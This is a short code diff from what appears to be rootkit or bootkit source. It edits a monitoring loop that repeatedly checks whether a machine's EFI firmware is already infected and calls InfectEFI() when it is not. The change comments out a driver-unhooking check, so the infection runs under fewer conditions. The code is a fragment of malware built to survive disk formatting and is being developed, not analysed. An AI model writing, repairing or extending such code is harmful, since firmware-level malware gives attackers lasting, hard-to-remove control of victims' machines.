@@ -63,7 +63,7 @@ DWORD WINAPI MonitorFormatStatus(DWORD dummy)
 	HideDevice dev_unhook;
 	LOOP {
 		if (is_format_resistant && IsFiles()) 
-			if (dev_unhook.unhook_isdrv(DRIVER_NAME_W))
+			//if (dev_unhook.unhook_isdrv(DRIVER_NAME_W))
 				if (CheckCreateLock() && !IsEFIInfected())
 					InfectEFI();
 		Sleep(FORMAT_RESISTANCE_TIME);
